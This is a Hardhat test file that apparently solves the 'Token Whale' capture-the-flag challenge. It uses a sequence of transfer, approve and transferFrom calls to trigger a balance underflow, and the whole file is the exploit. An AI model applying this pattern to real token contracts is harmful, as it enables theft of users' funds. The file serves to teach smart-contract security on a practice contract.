import { SignerWithAddress } from '@nomiclabs/hardhat-ethers/signers';
import { expect } from 'chai';
import { Contract } from 'ethers';
import { ethers } from 'hardhat';

describe('TokenWhaleChallenge', () => {
  let target: Contract;
  let attacker: SignerWithAddress;
  let deployer: SignerWithAddress;

  before(async () => {
    [attacker, deployer] = await ethers.getSigners();

    target = await (
      await ethers.getContractFactory('TokenWhaleChallenge', deployer)
    ).deploy(attacker.address);

    await target.deployed();
  });

  it('exploit', async () => {
    await target.connect(attacker).transfer(deployer.address, 501);
    await target.approve(attacker.address, 501);
    await target.connect(attacker).transferFrom(deployer.address, deployer.address, 501);

    expect(await target.isComplete()).to.equal(true);
  });
});
